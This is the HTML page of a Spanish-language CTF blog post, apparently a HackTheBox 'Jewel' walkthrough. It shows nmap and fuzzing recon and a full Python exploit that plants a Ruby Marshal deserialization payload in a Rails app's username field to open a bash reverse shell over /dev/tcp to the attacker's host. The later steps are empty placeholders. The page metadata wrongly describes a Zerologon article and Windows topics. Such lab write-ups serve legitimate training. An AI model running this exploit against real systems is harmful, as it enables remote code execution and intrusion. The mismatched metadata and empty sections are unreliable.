<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="es" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HackTheBox Jewel - jflabur.io</title>
<meta name="description" content="Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero… ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.">



<meta property="og:type" content="article">
<meta property="og:locale" content="es_ES">
<meta property="og:site_name" content="jflabur.io">
<meta property="og:title" content="HackTheBox Jewel">
<meta property="og:url" content="http://localhost:4000/hackthebox-jewel/">


  <meta property="og:description" content="Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero… ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.">



  <meta property="og:image" content="http://localhost:4000/assets/images/zerologon/zerologon.png">





  <meta property="article:published_time" content="2020-09-16T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/hackthebox-jewel/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Jflabur",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="jflabur.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/videos/" >Vídeos</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">HackTheBox Jewel</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="Jflabur" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Jflabur</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester / OSCP / OSWP / eWPTxv2
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Tenerife</span>
        </li>
      

      

      

      
        <li>
          <a href="mailto:s4vipriv@gmail.com">
            <meta itemprop="email" content="s4vipriv@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      
        <li>
          <a href="https://twitter.com/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      
        
          <li>
            <a href="https://youtube.com/c/jflabur" itemprop="sameAs" rel="nofollow noopener noreferrer">
              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
            </a>
          </li>
        
      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HackTheBox Jewel">
    <meta itemprop="description" content="Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero… ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.">
    <meta itemprop="datePublished" content="September 16, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox Jewel
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-09-16T00:00:00+02:00">September 16, 2020 </time>&emsp;
          
          
        </p>
        <div style="float: left; margin-left: 45px; margin-right: 35px;margin-top: 35px;">
	<table>
                                <thead>
                                   <tr>
                                        <th>Column  </th><th>
                                            Detalles
                                </th></tr></thead><tbody>
                                    <tr>
                                        <td>Name
                                        </td><td>
                                            Jewel
                                    </td></tr><tr>
                                        <td>IP
                                        </td><td>
                                            10.10.10.211
                                    </td></tr><tr>
                                        <td>Points
                                        </td><td>
                                            30
                                    </td></tr><tr>
                                        <td>Os
                                        </td><td>
                                            Linux
                                    </td></tr><tr>
                                        <td>Medium
                                        </td><td>
                                            Hard
                                    </td></tr><tr>
                                        <td>Creator
                                        </td><td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/159204" target="_blank">polarbearer</a>
                                    </td></tr><tr>
                                        <td>Out On
                                        </td><td>10 Oct 2020
                            </td></tr></tbody>
</table>
	</div>

<div>
	<p align="left">
<img src="/assets/images/jewel/jewel.png" />
</p>
</div>

<h1 id="resumen">Resumen</h1>

<ul>
  <li><a href="#nmap-muestra-los-3-puertos-abiertos"><code class="language-plaintext highlighter-rouge">Nmap</code> muestra los 3 puertos abiertos.</a></li>
  <li><a href="#conseguir-el-web-server">Conseguir el <code class="language-plaintext highlighter-rouge">web server</code></a></li>
  <li><a href="#inyecctando-la-shell-en-el-servidor">Inyecctando la <code class="language-plaintext highlighter-rouge">Shell</code> en el servidor</a></li>
  <li><a href="#conseguir-la-shell-desde-el-servidor">Conseguir la <code class="language-plaintext highlighter-rouge">Shell</code> desde el servidor</a></li>
  <li><a href="#conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor">Conseguir el password de la cuenta de bill en los <code class="language-plaintext highlighter-rouge">backups del servidor</code></a></li>
  <li><a href="#obtener-el-codigo-de-google-authenticator">Obtener el codigo de <code class="language-plaintext highlighter-rouge">Google Authenticator</code></a></li>
  <li><a href="#usando-el-comando-sudo--l">Usando el comando <code class="language-plaintext highlighter-rouge">sudo -l</code></a></li>
  <li><a href="#con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt">Con la ayuda de GTFO bins obtenemos el root.txt</a></li>
</ul>

<h2 id="nmap-muestra-los-3-puertos-abiertos"><code class="language-plaintext highlighter-rouge">Nmap</code> muestra los 3 puertos abiertos.</h2>
<p>Primero añadinos a nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code> la máquina Jewel.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.10.10.211  jewel.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>
<p>Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.</p>

<ul>
  <li>scaneo inicial de puertos abiertos sobre el sistema</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-nmap</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.211
</code></pre></div></div>
<p align="center">
<img src="/assets/images/jewel/nmap1.png" />
</p>

<ul>
  <li>Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span><span class="si">$(</span><span class="nb">cat </span>allPorts | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{2,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">"/"</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.211 <span class="nt">-oN</span> targeted
</code></pre></div></div>
<p>La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).</p>

<ul>
  <li>En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.211 <span class="nt">-oN</span> misc
</code></pre></div></div>

<p>Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p1-10000</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> ipHost <span class="nt">-n</span> <span class="nt">-oG</span> range1-10000
nmap <span class="nt">-p10000-20000</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> ipHost <span class="nt">-n</span> <span class="nt">-oG</span> range10000-20000
nmap <span class="nt">-p20000-30000</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> ipHost <span class="nt">-n</span> <span class="nt">-oG</span> range20000-30000
                        <span class="nb">.</span>
                        <span class="nb">.</span>
                        <span class="nb">.</span>
</code></pre></div></div>

<p>En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script http-enum.nse de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span>http-enum.nse <span class="nt">-p80</span>,443,8080 10.10.10.211 <span class="nt">-oN</span> webScan
</code></pre></div></div>

<ul>
  <li>Visualización de categorías para los scripts de nmap</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-r</span> categories /usr/share/nmap/scripts/<span class="k">*</span>.nse | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
</code></pre></div></div>

<p>Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p21</span>,445 <span class="nt">--script</span><span class="o">=</span><span class="s2">"vuln and safe"</span> 10.10.10.211 <span class="nt">-oN</span> vulnSafeScan
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> 10.10.10.211 <span class="nt">-oG</span> allPorts
</code></pre></div></div>
<p align="center">
<img src="/assets/images/jewel/nmap2.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which extratPorts
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p8080</span> 10.10.10.211 <span class="nt">-oN</span> targeted
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>whatweb http://10.10.10.211:8080 2&gt;/dev/null
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> http-enum <span class="nt">-p8080</span> 10.10.10.211 <span class="nt">-oN</span> webScan
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.211:8080/FUZZ
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>

<h2 id="conseguir-el-web-server">Conseguir el <code class="language-plaintext highlighter-rouge">web server</code></h2>
<p>Script en python para conseguir <code class="language-plaintext highlighter-rouge">Shell</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">URL</span><span class="o">=</span><span class="s">'http://{}:8080'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">username</span><span class="o">=</span><span class="s">'myuser4'</span>
<span class="n">password</span><span class="o">=</span><span class="s">'mypass4'</span>
<span class="n">email</span><span class="o">=</span><span class="s">'myuser4@mail.com'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/signup'</span><span class="p">)</span>
<span class="n">rx</span> <span class="o">=</span> <span class="s">r'token" content="(.*)"'</span>

<span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">rx</span><span class="p">,</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># create user
</span><span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">data</span><span class="p">[</span><span class="s">'utf8'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'â'</span>
<span class="n">data</span><span class="p">[</span><span class="s">'authenticity_token'</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
<span class="n">data</span><span class="p">[</span><span class="s">'user[username]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
<span class="n">data</span><span class="p">[</span><span class="s">'user[email]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">email</span>
<span class="n">data</span><span class="p">[</span><span class="s">'user[password]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
<span class="n">data</span><span class="p">[</span><span class="s">'commit'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Create User'</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/users'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="c1"># login
</span><span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">data</span><span class="p">[</span><span class="s">'utf8'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'â'</span>
<span class="n">data</span><span class="p">[</span><span class="s">'authenticity_token'</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
<span class="n">data</span><span class="p">[</span><span class="s">'session[email]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">email</span>
<span class="n">data</span><span class="p">[</span><span class="s">'session[password]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
<span class="n">data</span><span class="p">[</span><span class="s">'commit'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Log in'</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/login'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">rx</span> <span class="o">=</span> <span class="s">r'href="/users/(.*)"'</span>
<span class="n">user_id</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">rx</span><span class="p">,</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># rev shell
</span><span class="n">rev</span> <span class="o">=</span> <span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1'"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x04\x08</span><span class="s">o</span><span class="se">\x3A\x40</span><span class="s">ActiveSupport</span><span class="se">\x3A\x3A</span><span class="s">Deprecation</span><span class="se">\x3A\x3A</span><span class="s">DeprecatedInstanceVariableProxy'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x09\x3A\x0E\x40</span><span class="s">instanceo</span><span class="se">\x3A\x08</span><span class="s">ERB</span><span class="se">\x08\x3A\x09\x40</span><span class="s">srcI</span><span class="se">\x22</span><span class="s">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'{}</span><span class="se">\x60</span><span class="s">{}</span><span class="se">\x60</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rev</span><span class="p">)</span><span class="o">+</span><span class="mi">7</span><span class="p">),</span> <span class="n">rev</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x06\x3A\x06</span><span class="s">ET</span><span class="se">\x3A\x0E\x40</span><span class="s">filenameI</span><span class="se">\x22\x06</span><span class="s">1</span><span class="se">\x06\x3B\x09</span><span class="s">T</span><span class="se">\x3A\x0C\x40</span><span class="s">linenoi</span><span class="se">\x06\x3A\x0C\x40</span><span class="s">method</span><span class="se">\x3A</span><span class="s">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x0B</span><span class="s">result</span><span class="se">\x3A\x09\x40</span><span class="s">varI</span><span class="se">\x22\x0C\x40</span><span class="s">result</span><span class="se">\x06\x3B\x09</span><span class="s">T</span><span class="se">\x3A\x10\x40</span><span class="s">deprecatorIu</span><span class="se">\x3A\x1F</span><span class="s">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'ActiveSupport</span><span class="se">\x3A\x3A</span><span class="s">Deprecation</span><span class="se">\x00\x06\x3B\x09</span><span class="s">T'</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">data</span><span class="p">[</span><span class="s">'utf8'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'â'</span>
<span class="n">data</span><span class="p">[</span><span class="s">'authenticity_token'</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
<span class="n">data</span><span class="p">[</span><span class="s">'_method'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'patch'</span>
<span class="n">data</span><span class="p">[</span><span class="s">'user[username]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
<span class="n">data</span><span class="p">[</span><span class="s">'commit'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Update User'</span>
<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/users/'</span> <span class="o">+</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/users/'</span> <span class="o">+</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/articles'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="inyecctando-la-shell-en-el-servidor">Inyecctando la <code class="language-plaintext highlighter-rouge">Shell</code> en el servidor</h2>
<p>xxxxxxxxxxxxxxx</p>

<h2 id="conseguir-la-shell-desde-el-servidor">Conseguir la <code class="language-plaintext highlighter-rouge">Shell</code> desde el servidor</h2>
<p>xxxxxxxxxxxxxxx</p>

<h2 id="conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor">Conseguir el password de la cuenta de bill en los <code class="language-plaintext highlighter-rouge">backups del servidor</code></h2>
<p>xxxxxxxxxxxxxxx</p>

<h2 id="obtener-el-codigo-de-google-authenticator">Obtener el codigo de <code class="language-plaintext highlighter-rouge">Google Authenticator</code></h2>
<p>xxxxxxxxxxxxxxx</p>

<h2 id="usando-el-comando-sudo--l">Usando el comando <code class="language-plaintext highlighter-rouge">sudo -l</code></h2>
<p>xxxxxxxxxxxxxxx</p>

<h2 id="con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt">Con la ayuda de GTFO bins obtenemos el root.txt</h2>
<p>xxxxxxxxxxxxxxxc</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#domain-controller" class="page__taxonomy-item" rel="tag">Domain Controller</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#gu%C3%ADas" class="page__taxonomy-item" rel="tag">Guías</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentesting" class="page__taxonomy-item" rel="tag">Pentesting</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#privilege-escalation" class="page__taxonomy-item" rel="tag">Privilege Escalation</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#exploits" class="page__taxonomy-item" rel="tag">Exploits</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#utilidades" class="page__taxonomy-item" rel="tag">Utilidades</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#vulnerabilidades" class="page__taxonomy-item" rel="tag">Vulnerabilidades</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2020-09-16T00:00:00+02:00">September 16, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/como-crear-un-sistema-linux/" class="pagination--pager" title="Cómo construir tu propio sistema Linux
">Previous</a>
    
    
      <a href="/como-configurar-un-buen-entorno-de-trabajo-en-linux/" class="pagination--pager" title="Cómo configurar un buen entorno de trabajo en Linux
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2020 Jflabur</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
